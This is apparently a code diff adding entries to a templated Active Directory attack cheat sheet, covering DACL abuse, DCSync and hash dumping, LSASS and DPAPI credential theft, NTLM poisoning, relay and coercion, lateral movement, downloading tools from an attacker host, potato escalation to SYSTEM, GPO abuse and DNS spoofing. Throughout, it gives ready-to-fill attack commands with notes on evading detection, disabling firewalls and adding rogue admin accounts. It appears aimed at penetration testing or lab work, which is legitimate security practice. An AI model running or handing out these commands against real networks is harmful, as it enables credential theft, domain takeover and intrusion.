+ [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}'`,'RBCD ticket'],
+ [`nxc smb {{target_host}} -u '{{target_user}}' -H '<hash from certipy shadow>' --local-auth --sam --lsa`,'use shadow hash']
+],note:'If the target is a DC: shadow credentials → hash → <span class="mono">--ntds</span>. WriteAccountRestrictions specifically is the RBCD-oriented right.'});
+
+R({id:'dacl-genericall-group',cat:'dacl',title:'GenericAll / WriteMembers on group',desc:'Add yourself (or a controlled account) to a privileged group.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{user}}'`,'add self'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add groupMember '{{group}}' '{{user}}'`,'add self via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'add another account'],
+ [`net rpc group addmem '{{group}}' '{{user}}' -U '{{domain}}/{{user}}%{{password}}' -S {{dc_host}}`,'net rpc variant'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove groupMember '{{group}}' '{{user}}'`,'CLEANUP'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --groups | grep -i '{{group}}'`,'verify membership']
+],note:'Group changes apply on next logon/token refresh. For Domain Admins you may need to re-authenticate (new TGT) before the rights appear.'});
+
+R({id:'dacl-forcechangepassword',cat:'dacl',title:'ForceChangePassword / AddSelf',desc:'Reset a password without GenericAll (ForceChangePassword) or add yourself to a group (AddSelf).',
+cmds:[
+ [`net rpc password '{{target_user}}' 'Pwn3d123!' -U '{{domain}}/{{user}}%{{password}}' -S {{dc_host}}`,'ForceChangePassword via net rpc'],
+ [`net rpc password '{{target_user}}' 'Pwn3d123!' -U '{{domain}}/{{user}}' --use-krb5-ccache={{ccache}} -S {{dc_host}}`,'net rpc via ccache (samba)'],
+ [`rpcclient -U '{{domain}}/{{user}}%{{password}}' {{dc_host}} -c 'setuserinfo2 {{target_user}} 23 Pwn3d123!'`,'rpcclient variant'],
+ [`net rpc group addmem '{{group}}' '{{user}}' -U '{{domain}}/{{user}}%{{password}}' -S {{dc_host}}`,'AddSelf (you are the member)'],
+ [`nxc smb {{dc_host}} -u '{{target_user}}' -p 'Pwn3d123!'`,'verify']
+],note:'ForceChangePassword is the BloodHound edge name for the extended right <span class="mono">User-Force-Change-Password</span>. AddSelf only lets you add <b>yourself</b> to the group.'});
+
+R({id:'dacl-writedacl-dcsync',cat:'dacl',title:'WriteDacl on domain → DCSync',desc:'Grant yourself replication rights and dump every hash.',
+cmds:[
+ [`impacket-dacledit -action write -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'write DCSync ACE'],
+ [`impacket-dacledit -action write -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'write DCSync via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'`,'bloodyAD variant'],
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc`,'dump all domain hashes'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --ntds`,'nxc variant'],
+ [`impacket-dacledit -action remove -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'CLEANUP']
+],note:'You need WriteDACL / GenericAll on the domain object or to be owner. The domain DN is derived from your context (<span class="mono">{{domain_dn}}</span>) — verify it in the rendered command before running.'});
+
+R({id:'dacl-writeowner',cat:'dacl',title:'WriteOwner / ownership takeover',desc:'Take ownership first, then grant yourself WriteDACL and continue.',
+cmds:[
+ [`impacket-owneredit -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'take ownership (impacket)'],
+ [`impacket-owneredit -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'take ownership via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set owner '{{target_user}}' '{{user}}'`,'take ownership (bloodyAD)'],
+ [`impacket-dacledit -action write -rights FullControl -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'grant FullControl as new owner'],
+ [`impacket-dacledit -action write -rights WriteMembers -principal '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'or just WriteMembers (group takeover)']
+],note:'Order matters: WriteOwner → owner can rewrite the DACL → grant FullControl → do anything. As owner you can always change the DACL. For groups prefer <span class="mono">-rights WriteMembers</span> to stay quiet.'});
+
+R({id:'shadow-creds',cat:'dacl',title:'Shadow credentials (addKeyCredentialLink)',desc:'Add a Key Credential to an account, authenticate via PKINIT, get TGT + NT hash. No password change.',
+cmds:[
+ [`certipy shadow auto -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'certipy (auto: add, auth, clear)'],
+ [`certipy shadow auto -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -account '{{target_user}}'`,'certipy via ccache'],
+ [`certipy shadow auto -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'against a computer via PtH'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}' --path .`,'bloodyAD variant (ccache/pfx output)'],
+ [`certipy shadow clear -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'CLEANUP: remove key credential']
+],note:'Requires the DC to run Windows Server 2016+ and AD CS or a CA available for PKINIT. BloodHound edge: <span class="mono">AddKeyCredentialLink</span>. Windows equivalent: Rubeus <span class="mono">shadow /certify</span>.'});
+
+/* ===== CREDS & SECRETS ===== */
+R({id:'creds-dcsync',cat:'creds',title:'DCSync — dump domain secrets',desc:'Replicate secrets like a DC (needs DCSync rights / DA). The endgame on most boxes.',
+cmds:[
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc -outputfile {{hashfile}}`,'all hashes (password)'],
+ [`impacket-secretsdump '{{domain}}/{{user}}' -hashes ':{{nthash}}' -just-dc-ntlm -dc-ip {{dc_ip}}`,'NT hashes only (PtH)'],
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc-user '{{target_user}}'`,'single account'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --ntds`,'nxc NTDS dump'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -k --use-kcache --ntds`,'nxc via ccache'],
+ [`export KRB5CCNAME={{ccache}} && impacket-secretsdump -k -no-pass {{dc_fqdn}} -just-dc`,'impacket via ccache']
+],note:'<span class="mono">-just-dc-user krbtgt</span> for the golden-ticket key, <span class="mono">-just-dc-user {{netbios}}$</span> for trust keys. Output format: <span class="mono">user:rid:LM:NT:::</span> — NT hash for PtH.'});
+
+R({id:'creds-sam-lsa',cat:'creds',title:'Dump SAM / LSA (admin on a host)',desc:'Local accounts and LSA secrets from any machine where you are local admin.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --sam --lsa`,'domain account with local admin'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --local-auth --sam --lsa`,'local auth'],
+ [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' --sam --lsa`,'via PtH'],
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'impacket full dump'],
+ [`nxc smb {{target_host}} -u '{{user}}' -k --use-kcache --sam --lsa`,'nxc via ccache'],
+ [`impacket-secretsdump -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'impacket via ccache'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M lsassy`,'LSASS dump (all logon creds)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M nanodump`,'nanodump alternative']
+],note:'LSA secrets may contain service account passwords and cached domain creds. LSASS can hold plaintext creds for logged-on users — check for other sessions first.'});
+
+R({id:'creds-dpapi',cat:'creds',title:'DPAPI — browser / Windows credential blobs',desc:'Dump and decrypt DPAPI-protected secrets (Chrome/Edge/Outlook/Firefox).',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --dpapi`,'credentials + masterkeys'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --dpapi cookies`,'browser cookies'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --dpapi --local-auth`,'local accounts'],
+ [`nxc smb {{target_host}} -u '{{user}}' -k --use-kcache --dpapi`,'via ccache'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' --dpapi`,'via WinRM']
+],note:'Usually run with local admin. Plaintext results appear in the console output; masterkeys/cred files go to <span class="mono">/tmp/nxc/</span>.'});
+
+R({id:'creds-gmsa',cat:'creds',title:'gMSA / LAPS passwords',desc:'Group Managed Service Account password reads and LAPS local admin passwords.',
+cmds:[
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --gmsa`,'read readable gMSAs'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M laps`,'LAPS passwords'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'bloodyAD LAPS read'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'LAPS via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object 'gmsaAccount$' --attr msDS-ManagedPassword`,'bloodyAD gMSA read'],
+ [`nxc smb {{target_host}} -u '{{target_user}}' -p '<LAPS password>' --local-auth`,'use the LAPS password']
+],note:'Windows LAPS (2023+) uses <span class="mono">msLAPS-Password</span> instead of <span class="mono">ms-Mcs-AdmPwd</span>. gMSA read rights are granted per-account (<span class="mono">PrincipalsAllowedToRetrieveManagedPassword</span>).'});
+
+R({id:'creds-ntds-offline',cat:'creds',title:'Offline ntds.dit / SAM extraction',desc:'Got the files (backup, shadow copy, loot)? Parse them locally.',
+cmds:[
+ [`impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`,'parse local hives'],
+ [`impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`,'parse ntds.dit'],
+ [`impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY -hashes ':{{nthash}}' LOCAL`,'encrypted ntds (BootKey via SYSTEM)'],
+ [`secretsdump.py -ntds ntds.dit -system SYSTEM -history LOCAL`,'include password history'],
+ [`hashcat -m 1000 {{hashfile}} {{wordlist}}`,'crack dumped NTLM hashes','n']
+],note:'Grab files on a Windows target with <span class="mono">vssadmin create shadow</span>, <span class="mono">diskshadow</span>, or <span class="mono">ntdsutil</span> + <span class="mono">robocopy</span>. nxc <span class="mono">--ntds vss</span> does the shadow-copy route for you.'});
+
+/* ===== POISONING & RELAY ===== */
+R({id:'relay-responder',cat:'relay',title:'Responder — LLMNR/NBT-NS/mDNS poisoning',desc:'Catch NTLM hashes on the wire when DNS fails. First move with no creds.',
+cmds:[
+ [`sudo responder -I {{iface}} -A`,'analysis mode (see traffic first)','ns'],
+ [`sudo responder -I {{iface}} -wdv`,'poison WPAD + DNS + verbose','ns'],
+ [`sudo responder -I {{iface}} -wPv`,'proxy auth to ntlmrelayx (for relaying)','ns'],
+ [`hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt {{wordlist}}`,'crack captured NetNTLMv2','n'],
+ [`john --format=netntlmv2 --wordlist={{wordlist}} /usr/share/responder/logs/NTLMv2-*.txt`,'john alternative','n']
+],note:'Responder alone only captures hashes for cracking. To relay instead, disable its SMB/HTTP servers: <span class="mono">sudo responder -I {{iface}} -wPv</span> pairs with ntlmrelayx. NTLMv1 can be downgraded for faster cracking.'});
+
+R({id:'relay-smb',cat:'relay',title:'ntlmrelayx — relay to SMB',desc:'Forward captured NTLM auth to hosts where SMB signing is not required.',
+cmds:[
+ [`nxc smb {{target_ip}} --gen-relay-list relay-targets.txt`,'list hosts without SMB signing'],
+ [`impacket-ntlmrelayx -tf relay-targets.txt -smb2support -l /tmp/relay-loot`,'relay list, loot to disk','n'],
+ [`impacket-ntlmrelayx -t smb://{{target_ip}} -smb2support`,'relay single target','n'],
+ [`impacket-ntlmrelayx -tf relay-targets.txt -smb2support -c 'whoami /all'`,'relay + run command','n'],
+ [`impacket-ntlmrelayx -t smb://{{target_ip}} -smb2support --no-smb-server`,'no smb server (cleaner)','n']
+],note:'Relayed auth uses the victim computer account → if it is a local admin target side, ntlmrelayx dumps SAM automatically. Find signing-less hosts with <span class="mono">--gen-relay-list</span> (nxc) before poisoning.'});
+
+R({id:'relay-ldap',cat:'relay',title:'ntlmrelayx — relay to LDAP(S)',desc:'Relay to a DC without LDAP signing → grant a controlled account DCSync rights.',
+cmds:[
+ [`impacket-ntlmrelayx -t ldap://{{dc_host}} -smb2support`,'probe LDAP relay','n'],
+ [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --escalate-user '{{user}}' -smb2support`,'escalate user to DCSync','n'],
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc`,'use the granted rights'],
+ [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --add-computer '{{computer_name}}' '{{computer_pass}}' -smb2support`,'add a machine account','n']
+],note:'LDAPS relay works even with channel binding unless EPA is enforced; LDAP relay needs signing not required. Coerce a DC/service with PetitPotam/PrinterBug to trigger the auth first.'});
+
+R({id:'relay-rbcd',cat:'relay',title:'ntlmrelayx — RBCD via relay',desc:'No write rights? Let the relay create the machine and set delegation for you.',
+cmds:[
+ [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --delegate-access -smb2support`,'create machine + RBCD','n'],
+ [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --delegate-access --escalate-user '{{user}}' -smb2support`,'also escalate user','n'],
+ [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/<RANDOM$>:<PASSWORD>'`,'use printed machine creds'],
+ [`nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache --sam`,'dump with the ticket']
+],note:'ntlmrelayx prints the generated machine account name and password (<span class="mono">Adding computer account ... / Password ...</span>). The relayed account must have write access over the RBCD target (often the DC itself). Cleanup: <span class="mono">impacket-rbcd -action flush</span> + delete computer.'});
+
+R({id:'relay-socks',cat:'relay',title:'ntlmrelayx — SOCKS mode',desc:'Relay many sessions at once and interact through individual authenticated sockets.',
+cmds:[
+ [`impacket-ntlmrelayx -tf targets.txt -smb2support -socks -l /tmp/relay-loot`,'start SOCKS proxy','n'],
+ [`impacket-ntlmrelayx -tf targets.txt -smb2support -socks -socks-port 1080`,'custom socks port','n'],
+ [`proxychains4 -f /etc/proxychains4.conf impacket-secretsdump -no-pass '{{domain}}/user@target'`,'use a session through the proxy'],
+ [`# in ntlmrelayx console: socks — list sessions, stop <session-id>`,'manage sessions','n']
+],note:'Each relayed identity gets its own SOCKS port. Configure proxychains to point at the socks port (<span class="mono">socks5 127.0.0.1 1080</span>) and interact with any service as that user.'});
+
+R({id:'relay-coerce',cat:'relay',title:'Coercion — make targets authenticate to you',desc:'Force machine accounts (especially DCs) to authenticate to your relay or unconstrained host.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{attacker_ip}}`,'nxc coercion module'],
+ [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{target_host}}`,'all vectors, list only'],
+ [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{target_host}} -l {{attacker_ip}}`,'fire all vectors'],
+ [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'spooler (MS-RPRN)'],
+ [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'EFSRPC'],
+ [`impacket-dfscoerce '{{domain}}/{{user}}:{{password}}@{{target_host}}' '{{domain}}/{{dc_host}}'`,'DFS coerce']
+],note:'Combine with Responder/ntlmrelayx (<span class="mono">-M coerce_plus -o LISTENER={{attacker_ip}}</span> triggers and relays) or with an unconstrained-delegation host you own. Cheapest auth coercion on modern boxes is usually PetitPotam or DFSCoerce.'});
+
+/* ===== LATERAL MOVEMENT ===== */
+R({id:'lat-winrm',cat:'lateral',title:'WinRM — remote shell',desc:'5985/5986 shell with creds, hash or Kerberos ticket. Your favorite nxc first.',
+cmds:[
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -x whoami`,'nxc command exec'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -X 'Get-Process | Select-Object -First 5'`,'PowerShell exec'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -H '{{nthash}}'`,'PtH + interactive prompt'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -k --use-kcache -x whoami`,'Kerberos ccache'],
+ [`evil-winrm -i {{target_host}} -u '{{user}}' -p '{{password}}'`,'interactive shell'],
+ [`evil-winrm -i {{target_host}} -u '{{user}}' -H '{{nthash}}'`,'interactive PtH shell']
+],note:'evil-winrm extras: <span class="mono">-s</span> scripts dir, <span class="mono">-e</span> exes dir, <span class="mono">upload</span>/<span class="mono">download</span> commands, <span class="mono">menu</span> for AMSI bypass.'});
+
+R({id:'lat-smb-exec',cat:'lateral',title:'SMB exec via nxc',desc:'Run commands on hosts where you are local admin, no interactive shell needed.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'whoami'`,'cmd exec'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -X 'whoami /priv'`,'PowerShell exec'],
+ [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' -x 'whoami'`,'PtH exec'],
+ [`nxc smb {{target_host}} -u '{{user}}' -k --use-kcache -x 'whoami'`,'ccache exec'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --local-auth -x 'whoami'`,'local account exec']
+],note:'<span class="mono">-x</span> uses cmd, <span class="mono">-X</span> uses PowerShell. Great for one-liners like adding an admin user or starting a reverse shell.'});
+
+R({id:'lat-impacket-exec',cat:'lateral',title:'Impacket exec family (psexec/smbexec/wmiexec/atexec)',desc:'Drop-in alternatives when nxc is blocked or you want a different service binary / technique.',
+cmds:[
+ [`impacket-psexec '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'psexec (service, loud)'],
+ [`impacket-psexec -hashes ':{{nthash}}' '{{domain}}/{{user}}@{{target_host}}'`,'psexec PtH'],
+ [`impacket-smbexec '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'smbexec (semi-interactive)'],
+ [`impacket-wmiexec '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'wmiexec (quiet)'],
+ [`impacket-atexec '{{domain}}/{{user}}:{{password}}@{{target_host}}' 'whoami'`,'atexec (scheduled task)'],
+ [`impacket-psexec -k -no-pass '{{domain}}/{{user}}@{{target_host}}'`,'Kerberos via ccache'],
+ [`impacket-wmiexec -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'wmiexec via ccache'],
+ [`impacket-smbexec -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'smbexec via ccache']
+],note:'WMI is usually the quietest. Psexec writes a service binary to ADMIN$ — AV/EDR food and leaves artifacts. All of them need local admin/SMB write access.'});
+
+R({id:'lat-rdp',cat:'lateral',title:'Enable RDP / disable firewall / connect',desc:'Get an RDP session when port 3389 is closed or firewall blocks it.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M rdp -o ACTION=enable`,'enable RDP (registry)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'netsh advfirewall set allprofiles state off'`,'disable firewall'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'`,'manual registry toggle'],
+ [`xfreerdp /v:{{target_host}} /u:'{{user}}' /p:'{{password}}' /d:{{domain}} +clipboard /dynamic-resolution`,'connect (password)'],
+ [`xfreerdp /v:{{target_host}} /u:'{{user}}' /pth:'{{nthash}}' /d:{{domain}} /dynamic-resolution`,'connect via PtH (Restricted Admin)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M rdp -o ACTION=disable`,'CLEANUP: disable again']
+],note:'PtH over RDP needs <span class="mono">DisableRestrictedAdmin=0</span> on the target: <span class="mono">reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f</span>. nxc module name may vary by version (<span class="mono">rdp</span> vs <span class="mono">enable_rdp</span>).'});
+
+R({id:'rdp-auth',cat:'lateral',title:'RDP auth helper — password, Kerberos ccache, PtH',desc:'xfreerdp on Kali: NLA with or without Kerberos, ticket-only via Restricted Admin, hash fallback.',
+cmds:[
+ [`export KRB5CCNAME={{ccache}} && klist`,'Kerberos: make sure a valid TGT is present'],
+ [`xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /p:'{{password}}' /sec:nla /cert:ignore`,'NLA + password (SPNEGO uses the ccache → Kerberos)'],
+ [`xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /p:'{{password}}' /auth-pkg-list:'!ntlm,kerberos' /cert:ignore`,'force Kerberos only (fail if it falls back to NTLM)'],
+ [`KRB5CCNAME={{ccache}} xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /restricted-admin /cert:ignore`,'ccache only via Restricted Admin (server must allow it)'],
+ [`KRB5CCNAME={{ccache}} xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /remoteGuard /cert:ignore`,'Remote Credential Guard (FreeRDP ≥ 3.9, server-side RCG needed)'],
+ [`xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /pth:'{{nthash}}' /restricted-admin /cert:ignore`,'PtH fallback (Restricted Admin)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'`,'allow Restricted Admin (needs local admin)'],
+ [`xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /p:'{{password}}' +clipboard /dynamic-resolution /drive:share,/tmp`,'QoL: clipboard, resize, mount /tmp']
+],note:'FreeRDP negotiates the Kerberos part of NLA from the ccache, but still needs a password for the NLA credentials payload — unless you use <span class="mono">/restricted-admin</span> (or <span class="mono">/remoteGuard</span>), where those fields may be empty. That is why there is no plain "ticket only" command. Binary is <span class="mono">xfreerdp3</span> or <span class="mono">xfreerdp</span> depending on the Kali package. Always use the FQDN for Kerberos, add <span class="mono">/cert:ignore</span> for lab CAs, and enable RDP first (see <b>lat-rdp</b>). <span class="mono">proxychains</span> works over TCP/3389 but is slow.'});
+
+R({id:'lat-transfer',cat:'lateral',title:'File transfer — attacker ↔ target',desc:'Get tools onto the box or loot out.',
+cmds:[
+ [`python3 -m http.server {{lport}}`,'serve current dir (attacker, no proxy)','ns'],
+ [`impacket-smbserver share $(pwd) -smb2support`,'SMB share (attacker, no proxy)','ns'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --put-file ./tool.exe 'C:\\Windows\\Temp\\tool.exe'`,'nxc upload'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'certutil -urlcache -f http://{{attacker_ip}}:{{lport}}/tool.exe C:\\Windows\\Temp\\tool.exe'`,'certutil download'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -X 'iwr http://{{attacker_ip}}:{{lport}}/tool.exe -OutFile C:\\Windows\\Temp\\tool.exe'`,'PowerShell download'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'copy \\\\{{attacker_ip}}\\share\\tool.exe C:\\Windows\\Temp\\tool.exe'`,'copy from SMB share']
+],note:'If egress is filtered, SMB share or WinRM upload are the fallbacks. For reverse shells: <span class="mono">nc -lvnp {{lport}}</span> on Kali and a base64 PowerShell payload on target.'});
+
+/* ===== POST-EXPLOITATION ===== */
+R({id:'post-seimpersonate',cat:'post',title:'SeImpersonate / SeAssignPrimaryToken → SYSTEM',desc:'IIS/MSSQL/service shells usually hold these — potato tools get you SYSTEM.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -X 'whoami /priv'`,'check privileges'],
+ [`nxc smb {{target_host}} -u '{{user}}' -k --use-kcache -X 'whoami /priv'`,'check via ccache'],
+ [`python3 -m http.server {{lport}}`,'serve potatoes (no proxy)','ns'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'certutil -urlcache -f http://{{attacker_ip}}:{{lport}}/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe'`,'transfer PrintSpoofer'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\ps.exe -c "cmd /c whoami"'`,'PrintSpoofer exec'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\GodPotato.exe -cmd "cmd /c whoami"'`,'GodPotato (.NET4)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'net user pwn Pwn3d123! /add && net localgroup administrators pwn /add'`,'add local admin (cleanup later)']
+],note:'Pick the potato by OS: PrintSpoofer/GodPotato (modern), SweetPotato/RoguePotato (older), JuicyPotato (2016/2019). Repos: <span class="mono">itm4n/PrintSpoofer</span>, <span class="mono">BeichenDream/GodPotato</span>, <span class="mono">CCob/SweetPotato</span>. Remove the user and tool afterwards.'});
+
+R({id:'post-gpo',cat:'post',title:'GPO abuse',desc:'Write on a GPO? Push a scheduled task / immediate task to every machine in scope.',
+cmds:[
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_password`,'GPP cpassword in SYSVOL'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_autologin`,'GPP autologin creds'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype GPO --detail`,'find writable GPOs'],
+ [`python3 pygpoabuse.py '{{domain}}/{{user}}' -p '{{password}}' -gpo-id '<GPO_GUID>' -command 'net localgroup administrators {{user}} /add' -f`,'push immediate task (Linux)'],
+ [`impacket-smbserver share $(pwd) -smb2support`,'serve payload for GPO','ns']
+],note:'pyGPOAbuse expects the GPO ID/GUID and write access (GenericWrite/WriteDACL) on the GPO object. Windows alternative: SharpGPOAbuse. Changes land on next <span class="mono">gpupdate</span> (default 90 min ± jitter) — trigger with <span class="mono">nxc smb -x "gpupdate /force"</span> if you are admin.'});
+
+R({id:'post-adidns',cat:'post',title:'ADIDNS record takeover',desc:'Spoof unregistered DNS names or add records for coercion/relay (AD-integrated DNS).',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dnsRecord '{{target_host}}' {{attacker_ip}}`,'add/overwrite A record'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dnsRecord '*' {{attacker_ip}}`,'wildcard record (spoof everything)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove dnsRecord '{{target_host}}'`,'CLEANUP: remove record'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M enum_dns`,'dump DNS zone (module version dependent)']
+],note:'Great combo: wildcard DNS record + Responder for WPAD-style spoofing inside AD networks, or to hijack a name that services connect to for coercion.'});
+
+/* ===== MSSQL ===== */
+R({id:'mssql-connect',cat:'mssql',title:'Connect to MSSQL',desc:'impacket-mssqlclient / nxc variants with password, hash or Kerberos.',
+cmds:[
+ [`impacket-mssqlclient '{{domain}}/{{user}}:{{password}}@{{target_host}}' -windows-auth`,'Windows auth (password)'],
+ [`impacket-mssqlclient -hashes ':{{nthash}}' '{{domain}}/{{user}}@{{target_host}}' -windows-auth`,'Windows auth (PtH)'],
+ [`impacket-mssqlclient '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'SQL login'],
+ [`KRB5CCNAME={{ccache}} impacket-mssqlclient -k -no-pass '{{target_host}}'`,'Kerberos ccache'],
+ [`nxc mssql {{target_host}} -u '{{user}}' -k --use-kcache -q 'select @@version'`,'nxc via ccache'],
+ [`nxc mssql {{target_host}} -u '{{user}}' -p '{{password}}' -d {{domain}} -q 'select @@version'`,'nxc quick query']
